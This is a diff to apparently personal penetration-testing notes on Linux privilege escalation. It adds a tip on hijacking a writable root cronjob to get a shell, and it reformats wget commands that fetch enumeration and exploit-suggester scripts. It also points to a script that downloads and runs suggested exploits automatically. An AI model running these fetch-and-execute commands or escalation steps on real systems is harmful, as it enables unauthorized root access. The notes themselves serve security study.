@@ -77,15 +77,16 @@ Linux elevation of privileges
     *$ ps aux | grep root*
 
     If */etc/exports* if writable, you can add an NFS entry to a root directory, put a binary with SUID bit on, and get root
+    If there is a *cronjob* that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.
 
 Scripts to run
     The following script runs exploit suggester and automatically downloads and executes suggested exploits:
     *https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py*
     Other scripts:
-    *wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
-wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl*
+    *wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py*
+    *wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh*
+    *wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh*
+    *wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl*
 
 
 Exploits worth running
